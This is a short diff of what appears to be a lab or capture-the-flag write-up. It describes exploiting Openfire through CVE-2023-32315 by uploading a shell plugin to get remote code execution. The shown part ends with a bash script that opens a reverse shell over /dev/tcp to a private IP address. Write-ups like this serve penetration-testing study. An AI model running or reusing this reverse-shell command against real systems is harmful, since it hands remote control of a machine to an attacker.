@@ -19,9 +19,9 @@ google found the version is CVE-2023-32315
 ```
 https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass?tab=readme-ov-file
 ```
-follow the instruction and upload to shell plugin to operfire and use RCE 
-for some reason, nc and python is not working in the RCE 
-so i created a script
+follow the instruction and upload to shell plugin to operfire and use RCE   
+for some reason, nc and python is not working in the RCE   
+so i created a script  
 ```
 #!/bin/bash
 /bin/sh -i >& /dev/tcp/192.168.45.166/22 0>&1
